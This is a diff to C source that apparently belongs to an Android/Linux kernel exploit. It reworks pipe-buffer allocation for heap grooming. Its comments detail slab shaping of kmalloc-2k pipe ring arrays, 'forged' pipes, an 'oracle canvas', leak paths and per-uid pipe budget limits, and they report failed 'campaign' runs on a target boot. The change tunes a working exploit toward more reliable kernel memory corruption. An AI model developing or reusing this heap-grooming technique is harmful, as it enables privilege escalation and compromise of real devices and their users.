@@ -177,6 +177,7 @@ static size_t pipe_sysctl_max_slots(void) {
  *    under a >= 106,496-B cap). Only when the sysctl is unreadable does a
  *    probe16 EPERM fall back to the sysctl-cap verdict. */
 static int pipe_wall_probe_done;
+static int pipe_budget_plan_logged;
 
 static size_t pipe_held_slots_estimate(void) {
   size_t total = 0;
@@ -461,26 +462,32 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
 #endif
 
-  for (size_t i = 0; i < PIPE_DRAIN; i++) {
-    /* budget hygiene before the oracle-canvas resize (a54-fork main.c:454-465
-     * pattern): F_SETPIPE_SZ growth is charged per-real-uid against
-     * fs.pipe-user-pages-soft, and the 240 drain rings at 32 slots hold
-     * 7,680 slot-units the reclaim growth below still needs. The drain
-     * pipes carry no data and are never forged — their only job is the
-     * kmalloc-2k ring-array slab shape, which the 26-slot floor preserves
-     * (26 x 0x28 = 1040 B, same bucket) — so growing them at the floor
-     * hands 1,440 slot-units back to the per-uid pool right before the
-     * reclaim rings (the oracle canvas) resize. */
-    if (alloc_pipe_object_slots(pipe_fds_drain[i],
-                                P0_PIPE_RING_MIN_SLOTS) != 0) {
-      /* no pr_error here: it is exit(-1), and an exit inside this prepare
-       * child leaves the fork-hold holding result_pipe[1] so the parent
-       * blocks on read() until the attempt timeout — warning + the same
-       * early-return the failed-leak path uses instead */
-      pr_warning("p0 pipe ring alloc failed drain=%zu\n", i);
-      pipe_child_release_ctx(&prep, &spray, &pre, &post, buf);
-      return 0;
-    }
+  /* [pipefix] budget plan (campaign 13/15/16 arithmetic): F_SETPIPE_SZ
+   * growth is charged per-real-uid against fs.pipe-user-pages-soft, and
+   * CZDE enforces L=8192 slots (the A54 stock value is 16384, which is why
+   * the a54-fork arsenal fits there: 480x32 = 15,360 <= 16,384). The drain
+   * pipes therefore STAY at their creation size (2 slots, 480 slot-units)
+   * and never grow: every observed CZDE growth attempt died on the FIRST
+   * drain resize (try16 [pipefix]: probe16 and probe3 EPERM at
+   * this-process-pipe-slots=960), so a drain growth is a pure budget spend
+   * with no surviving benefit. Only the reclaim/oracle rings resize — they
+   * request 32 slots (960 + 240x30 = 8,160 <= 8,192 on a clean boot) and
+   * the 9db6c33 floor-26 cap is the safety net that keeps the ring array
+   * in the kmalloc-2k bucket (26 x 0x28 = 1040 B) when any other uid-2000
+   * pipe pages are already charged, for a worst-case pipeline total of
+   * 6,720 slot-units <= 8,192. Hold residue (the sleeping prepare child
+   * and the exit fork-hold keep ~496 slot-units of failed-attempt pipes
+   * alive) accumulates per failed attempt on a boot — that is what pushed
+   * every growth past L on boot ffffff80022f2e38 after the first
+   * campaigns; the plan below guarantees a fresh-boot run only. */
+  if (!pipe_budget_plan_logged) {
+    pipe_budget_plan_logged = 1;
+    pr_info("[pipefix] plan drain=%zu×%zu reclaim=%zu×%zu total=%zu "
+            "(budget model L=8192)\n",
+            (size_t)PIPE_DRAIN, (size_t)2, (size_t)PIPE_RECLAIM,
+            (size_t)P0_PIPE_RING_MIN_SLOTS,
+            (size_t)PIPE_DRAIN * 2 +
+                (size_t)PIPE_RECLAIM * P0_PIPE_RING_MIN_SLOTS);
   }
 
   pin_to_core(CORE);
